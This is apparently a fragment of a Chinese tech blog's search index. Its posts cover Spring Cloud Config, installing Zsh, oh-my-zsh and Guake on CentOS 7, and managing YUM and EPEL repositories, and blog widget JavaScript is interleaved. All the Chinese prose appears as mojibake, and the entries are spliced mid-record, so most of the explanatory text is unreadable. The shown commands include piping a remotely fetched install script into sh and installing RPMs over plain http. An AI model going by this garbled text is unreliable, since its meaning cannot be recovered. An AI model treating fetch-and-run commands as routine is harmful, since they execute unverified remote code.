#éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° discovery: enabled: true service-id: config-servereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: config-client-${server.port} #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºå 5. æµ‹è¯• é€šè¿‡ maven install å‘½ä»¤å°†å„ä¸ªåº”ç”¨å®‰è£…åˆ°æœ¬åœ°ï¼Œç„¶åå†ä½¿ç”¨å‘½ä»¤è¡Œå¯åŠ¨å„ä¸ªåº”ç”¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ IDEAã€Eclipse é‡Œå¯åŠ¨ï¼Œå…·ä½“çš„å‘½ä»¤å¦‚ä¸‹ï¼š 1234567891011121314# å¯åŠ¨Eurekajava -jar eureka-server-1.0-SNAPSHOT.jar# å¯åŠ¨Config Serverï¼ˆé»˜è®¤ç«¯å£ï¼š8001ï¼‰java -jar config-server-1.0-SNAPSHOT.jar# å¯åŠ¨Config Serverjava -jar config-server-1.0-SNAPSHOT.jar --server.port=8002# å¯åŠ¨Config Configï¼ˆé»˜è®¤ç«¯å£ï¼š9001ï¼‰java -jar config-client-1.0-SNAPSHOT.jar# å¯åŠ¨Config Configjava -jar config-client-1.0-SNAPSHOT.jar --server.port=9002 å½“ä¸¤ä¸ª Config Client åº”ç”¨å¯åŠ¨å®Œæˆåï¼ŒæŸ¥çœ‹æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ï¼Œçœ‹çœ‹æ˜¯å¦å·²ç»è´Ÿè½½äº†ï¼›å¦‚æœæ²¡æœ‰è´Ÿè½½åˆ°ä¹Ÿæ²¡å…³ç³»ï¼Œå¯ä»¥å¯åŠ¨å¤šä¸ª Config Client å®ä¾‹å†è¯•è¯• æµè§ˆå™¨è®¿é—® http://127.0.0.1:9001/getConfigInfoã€http://127.0.0.1:9002/getConfigInfoï¼Œè§‚å¯Ÿæ˜¯å¦å¯ä»¥æ­£ç¡®è¿”å›é…ç½®ä¿¡æ¯ Config æºç è§£æï¼ˆå¾…ç»­ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Centos7 å®‰è£… Zsh ä¸ Guake",url:"/posts/f83b3bd2.html",text:'Zsh ä»‹ç» Shell æ˜¯åœ¨å¼€å‘äººå‘˜ä¸æœåŠ¡å™¨é—´å»ºç«‹ä¸€ä¸ªæ¡¥æ¢ï¼Œå®ƒå¯¹å¤–æä¾›ä¸€ç³»åˆ—å‘½ä»¤ï¼Œè®©æˆ‘ä»¬å¾—ä»¥æ§åˆ¶æœåŠ¡å™¨ã€‚å¸¸ç”¨çš„ Bash å°±æ˜¯ Shell çš„ä¸€ç§ï¼Œä¹Ÿæ˜¯ Linux ä¸‹é»˜è®¤ Shell ç¨‹åºã€‚Zsh å±äº Shell ä¸­çš„ä¸€ç§ï¼Œä½†æ¯” Bash å¥½ç”¨ï¼Œè€Œä¸”å®Œå…¨å…¼å®¹ Bashï¼Œæ‹¥æœ‰åŠå…¶ä¸°å¯Œçš„æ’ä»¶ã€å¼ºå¤§çš„å‘½ä»¤è‡ªåŠ¨è¡¥å…¨èƒ½åŠ›ã€ä»¥åŠè‡ªå®šä¹‰åŠŸèƒ½ï¼Œå¯ä»¥å¤§å¤§æä¾›ä½¿ç”¨ Linux çš„æ•ˆç‡ã€‚ Zsh å®‰è£… 12345678# å®‰è£…ä¾èµ–# yum install git curl wget# æŸ¥çœ‹æ˜¯å¦å­˜åœ¨zsh# cat /etc/shells# å¦‚æœzshä¸å­˜åœ¨ï¼Œåˆ™å®‰è£…zsh# yum install zsh æœ¬åœ° Shell åˆ‡æ¢åˆ° Zsh 1234567891011121314151617# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# æŸ¥çœ‹å½“å‰shell# echo $SHELL# åˆ‡æ¢shellåˆ°zsh# chsh -s /bin/zsh# é‡å¯ç³»ç»Ÿ# reboot# æŸ¥çœ‹å½“å‰shellæ˜¯å¦åˆ‡æ¢æˆåŠŸ# echo $SHELL# é»˜è®¤çš„zshé…ç½®æ–‡ä»¶ï¼ˆè‡ªåŠ¨ç”Ÿæˆï¼‰ï¼š~/.zshrc# æç¤ºï¼šåˆ‡æ¢åˆ°zshåï¼Œä»¥å‰åœ¨bash shellé‡Œæ·»åŠ çš„ç¯å¢ƒå˜é‡(~/.bashrc)å¯èƒ½ä¼šå¤±æ•ˆï¼Œæ­¤æ—¶éœ€è¦åœ¨zshçš„é…ç½®æ–‡ä»¶(~/.zshrc)ä¸­é‡æ–°æ·»åŠ ç›¸å…³ç¯å¢ƒå˜é‡ è§£å†³åˆ‡æ¢åˆ° Zsh å¯¼è‡´ Fcitx + æœç‹—è¾“å…¥æ³•æ— æ³•ä½¿ç”¨çš„é—®é¢˜ 123456789101112131415161718192021# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# æ›´æ”¹zshçš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ fcitxç›¸å…³çš„ç¯å¢ƒå˜é‡ï¼ˆä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬é…ç½®ï¼‰# vim ~/.zshrcexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# è®¾ç½®GNOMEçš„æ³¨å†Œè¡¨ï¼ˆæˆ–è€…ä½¿ç”¨dconf-editorå¯è§†åŒ–å·¥å…·æ¥è®¾ç½®æ³¨å†Œè¡¨ï¼‰# gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# é‡å¯ç³»ç»Ÿ# reboot# å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½æ— æ³•è§£å†³ï¼Œé‚£ä¹ˆå¯æŸ¥çœ‹fcitxçš„é”™è¯¯æ—¥å¿—ä¿¡æ¯æ¥æ’æŸ¥é—®é¢˜# cat ~/.config/fcitx/log/crash.log# æˆ–è€…æŸ¥çœ‹fcitxçš„å®‰è£…çŠ¶æ€ï¼Œé‡ç‚¹æŸ¥çœ‹çº¢è‰²éƒ¨åˆ†ï¼ˆé”™è¯¯ï¼‰çš„æ—¥å¿—ä¿¡æ¯# fcitx-diagnose Zsh çš„ä¸€äº›éªšæ°”æ“ä½œ 123456789101. è¿æŒ‰ä¸¤æ¬¡ Tab ä¼šåˆ—å‡ºæ‰€æœ‰çš„è¡¥å…¨åˆ—è¡¨å¹¶ç›´æ¥å¼€å§‹é€‰æ‹©ï¼Œè¡¥å…¨é¡¹å¯ä»¥ä½¿ç”¨ ctrl+n/p/f/b ä¸Šä¸‹å·¦å³åˆ‡æ¢2. å‘½ä»¤é€‰é¡¹è¡¥å…¨ï¼šåœ¨ zsh ä¸­åªéœ€è¦é”®å…¥ tar -&lt;tab&gt; å°±ä¼šåˆ—å‡ºæ‰€æœ‰çš„é€‰é¡¹å’Œå¸®åŠ©è¯´æ˜3. å‘½ä»¤å‚æ•°è¡¥å…¨ï¼šé”®å…¥ kill &lt;tab&gt; å°±ä¼šåˆ—å‡ºæ‰€æœ‰çš„è¿›ç¨‹åå’Œå¯¹åº”çš„è¿›ç¨‹å·4. æ›´æ™ºèƒ½çš„å†å²å‘½ä»¤ï¼šåœ¨ç”¨æˆ–è€…æ–¹å‘ä¸Šé”®æŸ¥æ‰¾å†å²å‘½ä»¤æ—¶ï¼Œzsh æ”¯æŒé™åˆ¶æŸ¥æ‰¾ã€‚æ¯”å¦‚ï¼Œè¾“å…¥ lsï¼Œç„¶åå†æŒ‰æ–¹å‘ä¸Šé”®ï¼Œåˆ™åªä¼šæŸ¥æ‰¾ç”¨è¿‡çš„ ls å‘½ä»¤ã€‚è€Œæ­¤æ—¶ä½¿ç”¨åˆ™ä¼šä»ç„¶æŒ‰ä¹‹å‰çš„æ–¹å¼æŸ¥æ‰¾ï¼Œå¿½ç•¥ ls5. å¤šä¸ªç»ˆç«¯ä¼šè¯å…±äº«å†å²è®°å½•6. æ™ºèƒ½è·³è½¬ï¼šå®‰è£…äº† autojump ä¹‹åï¼Œzsh ä¼šè‡ªåŠ¨è®°å½•ä½ è®¿é—®è¿‡çš„ç›®å½•ï¼Œé€šè¿‡ j ç›®å½•å å¯ä»¥ç›´æ¥è¿›è¡Œç›®å½•è·³è½¬ï¼Œè€Œä¸”ç›®å½•åæ”¯æŒæ¨¡ç³ŠåŒ¹é…å’Œè‡ªåŠ¨è¡¥å…¨ï¼Œä¾‹å¦‚ä½ è®¿é—®è¿‡ hadoop-1.0.0 ç›®å½•ï¼Œè¾“å…¥ j hado å³å¯æ­£ç¡®è·³è½¬ï¼Œè¾“å…¥ j --stat å¯ä»¥çœ‹ä½ çš„å†å²è·¯å¾„åº“7. ç›®å½•æµè§ˆå’Œè·³è½¬ï¼šè¾“å…¥ dï¼Œå³å¯åˆ—å‡ºä½ åœ¨è¿™ä¸ªä¼šè¯é‡Œè®¿é—®çš„ç›®å½•åˆ—è¡¨ï¼Œè¾“å…¥åˆ—è¡¨å‰çš„åºå·ï¼Œå³å¯ç›´æ¥è·³è½¬8. åœ¨å½“å‰ç›®å½•ä¸‹è¾“å…¥ .. æˆ– ... ï¼Œæˆ–ç›´æ¥è¾“å…¥å½“å‰ç›®å½•åéƒ½å¯ä»¥è·³è½¬ï¼Œä½ ç”šè‡³ä¸å†éœ€è¦è¾“å…¥ cd å‘½ä»¤äº†ã€‚åœ¨ä½ çŸ¥é“è·¯å¾„çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚ /usr/local/bin ä½ å¯ä»¥è¾“å…¥ cd /u/l/b ç„¶åæŒ‰è¿›è¡Œè¡¥å…¨å¿«é€Ÿè¾“å…¥9. é€šé…ç¬¦æœç´¢ï¼šls -l **/*.shï¼Œå¯ä»¥é€’å½’æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„ shell æ–‡ä»¶ï¼Œæ–‡ä»¶å°‘æ—¶å¯ä»¥ä»£æ›¿ findï¼Œæ–‡ä»¶å¤šçš„æ—¶å€™ä¸å»ºè®®ä½¿ç”¨10. åœ¨ ~/.zshrc ä¸­æ·»åŠ  setopt HIST_IGNORE_DUPS å¯ä»¥æ¶ˆé™¤é‡å¤è®°å½•ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ sort -t ";" -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history æ‰‹åŠ¨æ¸…é™¤ oh-my-zsh å®‰è£… Zsh è™½ç„¶ç‚«é…·ï¼Œä½†æ˜¯ç‚«é…·çš„èƒŒåæ˜¯å¤æ‚çš„é…ç½®ï¼Œæœ‰è¾ƒé«˜çš„ä½¿ç”¨é—¨æ§›ã€‚oh-my-zsh æ˜¯ä¸€ç¾¤å¼€æºçˆ±å¥½è€…ä¸€èµ·ç»´æŠ¤çš„ä¸€å¥— Zsh é…ç½®æ–‡ä»¶ï¼Œä¸“é—¨ä¸º Zsh æ‰“é€ ï¼Œç®€åŒ–äº† Zsh çš„ä½¿ç”¨ç»†èŠ‚ã€‚ 1234567891011121314# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# å®‰è£…oh-my-zsh# sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"# å®‰è£…oh-my-zshåï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤æ—¶æç¤ºï¼šwarning:cannot set LC_CTYPE localeï¼Œæ·»åŠ ä»¥ä¸‹ç¯å¢ƒå˜é‡å³å¯# vim ~/.zshrcexport LC_ALL=en_US.UTF-8export LC_CTYPE=en_US.UTF-8# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source ~/.zshrc# é»˜è®¤å®‰è£…ä½ç½®ï¼š~/.oh-my-zsh (adsbygoogle = window.adsbygoogle || []).push({}); oh-my-zsh ä½¿ç”¨ agnoster ä¸»é¢˜ oh-my-zsh å„ç§ä¸»é¢˜çš„æ˜¾ç¤ºæ•ˆæœå¯ä»¥ç‚¹å‡»è¿™é‡ŒæŸ¥çœ‹ã€‚ 123456789101112131415161718# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# å®‰è£…powerlineå­—ä½“# git clone https://github.com/powerline/fonts.git --depth=1# ./fonts/install.sh# rm -rf fonts# éªŒè¯powerlineå­—ä½“æ˜¯å¦å®‰è£…æˆåŠŸ# echo "\\ue0b0 \\u00b1 \\ue0a0 \\u27a6 \\u2718 \\u26a1 \\u2699"# æ›´æ”¹zshçš„ä¸»é¢˜ï¼Œå¦‚æœå°†å€¼è®¾ä¸ºç©ºï¼Œè¡¨ç¤ºä¸ä½¿ç”¨ä»»ä½•ä¸»é¢˜ï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸º"random"ï¼Œæ¯æ¬¡æ‰“å¼€ç»ˆç«¯éƒ½ä¼šéšæœºé€‰æ‹©ä¸€ç§ä¸»é¢˜# vim ~/.zshrcZSH_THEME="agnoster"# ä½¿é…ç½®ç”Ÿæ•ˆ# source ~/.zshrc# å­—ä½“powerlineçš„å®‰è£…è·¯å¾„ï¼š~/.local/share/fonts oh-my-zsh å®‰è£…è‡ªå®šä¹‰æ’ä»¶ oh-my-zsh æä¾›äº†å®Œå–„çš„æ’ä»¶ä½“ç³»ï¼Œç›¸å…³çš„æ’ä»¶æ–‡ä»¶åœ¨ /.oh-my-zsh/plugins ç›®å½•ä¸‹ï¼Œé»˜è®¤æä¾›äº† 100 å¤šç§æ’ä»¶ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å®é™…å­¦ä¹ å’Œå·¥ä½œç¯å¢ƒé€‰æ‹©æ€§é‡‡ç”¨ã€‚oh-my-zsh çš„æ’ä»¶ä¹Ÿæ˜¯åœ¨ /.zshrc é‡Œé…ç½®ï¼Œæ‰¾åˆ° plugins å…³é”®å­—ï¼Œæ·»åŠ è‡ªå·±çš„æ’ä»¶å³å¯ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ä»¥ä¸‹çš„æ–¹æ³•å®‰è£…è‡ªå®šä¹‰çš„æ’ä»¶ï¼Œç³»ç»Ÿé»˜è®¤åŠ è½½äº† git æ’ä»¶ã€‚æœ€åï¼Œè™½ç„¶ oh-my-zsh æä¾›äº†å¾ˆå¤šæ’ä»¶ï¼Œä¸è¿‡ä¹Ÿä¸è¦è´ªå¤šï¼ŒåŠ è½½å¤§é‡çš„æ’ä»¶ä¼šæ‹–æ…¢ oh-my-zsh çš„è¿è¡Œé€Ÿåº¦ï¼Œå› æ­¤å»ºè®®æŒ‰è‡ªå·±çš„å®é™…éœ€æ±‚åŠ è½½æ’ä»¶ã€‚ 12345678910111213141516171819# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# å®‰è£…è‡ªåŠ¨æç¤ºæ’ä»¶# git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions# å®‰è£…è¯­æ³•é«˜äº®æ’ä»¶# git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting# æ–‡ä»¶æˆæƒ# chmod -R 755 ~/.oh-my-zsh/custom/plugins# å¯ç”¨æ’ä»¶# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting)# ä½¿é…ç½®ç”Ÿæ•ˆ# source ~/.zshrc# è‡ªå®šä¹‰æ’ä»¶çš„å®‰è£…è·¯å¾„ï¼š~/.oh-my-zsh/custom/plugins oh-my-zsh å®‰è£… autojump æ’ä»¶ autojump æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒå¯ä»¥ä½¿ç”¨å¿«æ·å‘½ä»¤ç›´æ¥è·³è½¬åˆ°é¢„é…ç½®å¥½æˆ–è€…æ›¾ç»è¿›å…¥è¿‡çš„ç›®å½•ï¼Œè€Œä¸ç”¨ç®¡å½“å‰å¤„åœ¨å“ªä¸ªç›®å½•ä¸‹ï¼›é»˜è®¤æ˜¯é€šè¿‡è®°å½•ç›®å½•è·¯å¾„åˆ°æœ¬åœ°æ–‡ä»¶æˆ–è€…æ•°æ®åº“æ¥å®ç°ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯é¢„é…ç½®å¥½æˆ–è€…æ›¾ç»è¿›å…¥è¿‡çš„ç›®å½•æ‰èƒ½è·³è½¬ã€‚ç±»ä¼¼çš„å‘½ä»¤è¡Œå·¥å…·è¿˜æœ‰ z.luaã€‚ 1234567891011121314# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# å®‰è£…# yum instal autojump autojump-zsh# å¯ç”¨æ’ä»¶# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting autojump)# ä½¿é…ç½®ç”Ÿæ•ˆ# source ~/.zshrc# æŸ¥çœ‹æ˜¯å¦è¿è¡Œæ­£å¸¸# j --stat ZSH éšè—å‘½ä»¤è¡Œå‰é¢çš„ç”¨æˆ·åå’Œä¸»æœºå 1234567891011121314151617181920212223242526272829# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®ï¼ˆYUMæ“ä½œé™¤å¤–ï¼‰# ä¿®æ”¹ZSHçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹ï¼ˆä¸‹é¢å››ç§æ–¹å¼ä»»æ„é€‰ä¸€ç§å³å¯ï¼‰# vim ~/.zshrc# ç¬¬ä¸€ç§æ–¹å¼ï¼šéšè—ç”¨æˆ·åå’Œä¸»æœºåprompt_context() {}# ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨ä»»æ„è‡ªå®šä¹‰å­—ç¬¦ä¸²ä½œä¸ºç”¨æˆ·åå’Œä¸»æœºåprompt_context() { prompt_segment black default "xxxx"}# ç¬¬ä¸‰ç§æ–¹å¼ï¼šåªä¿ç•™ç”¨æˆ·åï¼Œéšè—ä¸»æœºåprompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$USER" fi}# ç¬¬å››ç§æ–¹å¼ï¼šåªä¿ç•™ä¸»æœºåï¼Œéšè—ç”¨æˆ·åprompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$HOST" fi}# ä½¿é…ç½®ç”Ÿæ•ˆ# source ~/.zshrc è§£å†³ oh-my-zsh + git å“åº”æ…¢ / å¡é¡¿çš„é—®é¢˜ 12345678# è¿›å…¥gité¡¹ç›®çš„æ ¹ç›®å½•# cd git-project# è®¾ç½®ä¸è¯»å–æ–‡ä»¶å˜åŒ–ä¿¡æ¯# git config --add oh-my-zsh.hide-dirty 1# æˆ–è€…ä¸è¯»å–ä»»ä½•gitä¿¡æ¯ï¼ˆé€Ÿåº¦æ›´å¿«ï¼‰# git config --add oh-my-zsh.hide-status 1 è§£å†³åˆ‡æ¢ä¸»é¢˜åï¼Œç»ˆç«¯æ˜¾ç¤ºä¹±ç çš„é—®é¢˜ 1231. è¿è¡Œç»ˆç«¯2. å¯¼èˆªåˆ°èœå•æ  --&gt; ç¼–è¾‘ --&gt; é¦–é€‰é¡¹ --&gt; æ–‡æœ¬ --&gt; è‡ªå®šä¹‰å­—ä½“ï¼Œé€‰æ‹©powerlineå­—ä½“ï¼Œå¦åˆ™agnosterä¸»é¢˜çš„ç®­å¤´ä¼šæ˜¾ç¤ºä¹±ç 3. å¯¼èˆªåˆ°èœå•æ  --&gt; ç¼–è¾‘ --&gt; é¦–é€‰é¡¹ --&gt; é¢œè‰² --&gt; è°ƒè‰²æ¿ï¼Œé€‰æ‹©å†…ç½®æ–¹æ¡ˆï¼Œæ›´æ”¹ç»ˆç«¯çš„ä¸åŒæ˜¾ç¤ºæ ·å¼ï¼ˆå¯é€‰æ“ä½œï¼‰ Guake å®‰è£… Guake æ˜¯ä¸€ä¸ªä¸‹æ‹‰å¼çš„ GNOME æ¡Œé¢ç¯å¢ƒä¸‹çš„ç»ˆç«¯ç¨‹åºï¼Œåªéœ€è¦æŒ‰ä¸€ä¸ªé”®å°±å¯ä»¥è°ƒç”¨å‡ºç»ˆç«¯ç•Œé¢ï¼Œå¤±å»ç„¦ç‚¹åä¼šè‡ªåŠ¨éšè—æ‰ã€‚å½“æœ‰äº›æ—¶å€™éœ€è¦ä¸´æ—¶æ‰§è¡Œä¸€ä¸¤ä¸ªå‘½ä»¤ï¼Œä½†æ˜¯åˆä¸æƒ³é¢å¤–å¯åŠ¨ä¸€ä¸ªç»ˆç«¯çš„æƒ…å†µä¸‹ï¼ŒGuake æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚Guake è¿˜æ”¯æŒå¿«æ·é”®ã€æ ‡ç­¾ã€èƒŒæ™¯é€æ˜ã€èƒŒæ™¯å›¾ç‰‡ç­‰ç‰¹æ€§ã€‚ 123456789# å®‰è£…guake# yum install guake# å¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; ç³»ç»Ÿå·¥å…· --&gt; Guake Terminalï¼Œç‚¹å‡»å³å¯å¯åŠ¨Guakeï¼›æˆ–è€…æŒ‰ä¸‹F12å³å¯è°ƒå‡ºGuakeï¼Œå†æ¬¡æŒ‰ä¸‹F12å³å¯éšè—æ‰# é…ç½®guake$ guake-prefs# æç¤ºï¼šGuakeå®Œç¾æ”¯æŒoh-my-zshï¼Œå…·ä½“é…ç½®æ–¹æ³•ä¸ä¸Šé¢ç»™å‡ºçš„ç»ˆç«¯é…ç½®ï¼ˆè§£å†³ç»ˆç«¯æ˜¾ç¤ºä¹±ç ï¼‰å¤§è‡´ç›¸åŒ oh-my-zsh æœ€ç»ˆè¿è¡Œæ•ˆæœå›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 ç®¡ç† YUM æºä¸ EPEL æº",url:"/posts/4688dc15.html",text:'YUM ç›¸å…³çš„é…ç½®æ–‡ä»¶åŠç›®å½• 123ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/yum.confèµ„æºåº“é…ç½®ç›®å½•ï¼š/etc/yum.repos.dé‡è¦æ–‡ä»¶ï¼š /etc/yum.repos.d/CentOS-Base.repo YUM å®‰è£…åŠ é€Ÿæ’ä»¶ 12345678910111213# å®‰è£…axelgetæ’ä»¶# yum install axel yum-plugin-fastestmirror yum-axelget# å¦‚æœä¸´æ—¶ä¸æƒ³å¯ç”¨axelgetæ’ä»¶ï¼Œå¯å‚è€ƒä»¥ä¸‹å‘½ä»¤# yum --disableplugin=axelget YumCommand# æ›´æ”¹axelgetæ’ä»¶é»˜è®¤çš„å¹¶å‘ä¸‹è½½çº¿ç¨‹æ•°ï¼Œç¼–è¾‘Pythonæºç æ–‡ä»¶ï¼Œä¿®æ”¹ä»¥ä¸‹å†…å®¹å³å¯# vim /usr/lib/yum-plugins/axelget.pymaxconn = 15maxconn = conduit.confInt(\'main\', \'maxconn\', default=15)# æŸ¥çœ‹å®é™…å¹¶å‘ä¸‹è½½çš„æ•ˆæœ# yum --debuglevel=3 YumCommand æ·»åŠ å¸¸ç”¨çš„ YUM æº 1234567891011121314151617181920# æ·»åŠ epelæº# yum install epel-release# æ·»åŠ nux-dextopæº# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# æ·»åŠ rpmfusion freeæº# yum localinstall http://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm# æ·»åŠ rpmfusion nonfreeæºï¼ˆé—­æºè½¯ä»¶çš„æºï¼Œä¸å»ºè®®ä½¿ç”¨ï¼‰# yum localinstall http://download1.rpmfusion.org/nonfree/el/rpmfusion-nonfree-release-7.noarch.rpm# æ¸…ç†æ•°æ®æº# yum clean all# é‡å»ºæ•°æ®æº# yum makecache# æŸ¥çœ‹å·²å®‰è£…çš„æº# yum repolist é…ç½® YUM æºä¸ºé˜¿é‡Œäº‘é•œåƒæº 1234567891011121314151617# å¤‡ä»½YUMæº# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak# ä¸‹è½½é˜¿é‡Œäº‘çš„YUMæº# wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# æˆ–è€…# curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# æ¸…ç†æ•°æ®æº# yum clean all# é‡å»ºæ•°æ®æº# yum makecache# æŸ¥çœ‹å·²å®‰è£…çš„æº# yum repolist é…ç½® EPEL æºä¸ºé˜¿é‡Œäº‘é•œåƒæº 12345678910111213141516171819# å¤‡ä»½EPELæº# cp /etc/yum.repos.d/epel-7.repo /etc/yum.repos.d/epel-7.repo.bak# ä¸‹è½½é˜¿é‡Œäº‘çš„EPELæº# wget -O /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# æˆ–è€…# curl -o /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# æ¸…ç†æ•°æ®æº# yum clean all# é‡å»ºæ•°æ®æº# yum makecache# æŸ¥çœ‹å·²å®‰è£…çš„æº# yum repolist# æç¤º:é…ç½®EPELæºä¸ºé˜¿é‡Œäº‘é•œåƒæºå,ä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨"yum install epel-release"å‘½ä»¤å®‰è£…EPELæº Centos7 å¸è½½ EPEL æº 12345678910111213141516171819# æŸ¥æ‰¾epelå·²å®‰è£…çš„rpmåŒ…# rpm -qa | grep epel# å¸è½½epelå·²å®‰è£…çš„rpmåŒ…# yum remove epel-release-7-11.noarch# ç¡®ä¿epelç›¸å…³æ–‡ä»¶å·²åˆ é™¤# rm /etc/yum.repos.d/epel.repo# rm /etc/yum.repos.depel-testing.repo# rm /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7# æ¸…ç†æ•°æ®æº# yum clean all# é‡å»ºæ•°æ®æº# yum makecache# æŸ¥çœ‹å·²å®‰è£…çš„æº# yum repolist ç¦ç”¨ YUM æº 1234567891011121314# æŸ¥çœ‹æ‰€æœ‰ä»“åº“æº# yum repolist all# æŸ¥çœ‹æ‰€æœ‰å·²å¯ç”¨çš„ä»“åº“æº# yum repolist# æ›´æ–°è½¯ä»¶ï¼Œå¹¶ä¸´æ—¶ç¦ç”¨æŸä¸ªä»“åº“æº# yum --disablerepo=Atom update -y# æ°¸ä¹…å¯ç”¨æŸä¸ªä»“åº“æº# yum-config-manager --enable Atom# æ°¸ä¹…ç¦ç”¨æŸä¸ªä»“åº“æº# yum-config-manager --disable Atom var isMobile 